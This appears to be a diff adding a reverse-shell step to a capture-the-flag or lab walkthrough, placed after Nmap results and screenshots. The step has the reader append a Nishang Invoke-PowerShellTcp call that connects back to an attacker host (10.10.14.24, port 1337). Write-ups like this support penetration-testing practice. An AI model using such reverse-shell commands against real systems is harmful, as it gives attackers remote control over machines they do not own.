@@ -78,3 +78,12 @@ Nmap done: 1 IP address (1 host up) scanned in 53.18 seconds
 ![image](https://user-images.githubusercontent.com/83878909/236399923-36a48d06-d4bf-4f21-bbbd-774488412b38.png)
 ![image](https://user-images.githubusercontent.com/83878909/236400279-596d3aac-959f-4467-8461-edf489fdb014.png)
 
+### Reverse Shell (Nishang)
+```CSS
+Invoke-PowerShellTcp.ps1
+```
+  - Add the below line to the end of the nishang script to call the function `Invoke-PowerShellTcp`.
+```CSS
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 1337
+```
+![image](https://user-images.githubusercontent.com/83878909/236402506-7d9ab4a3-c03b-4f9a-95df-9919a096fab8.png)
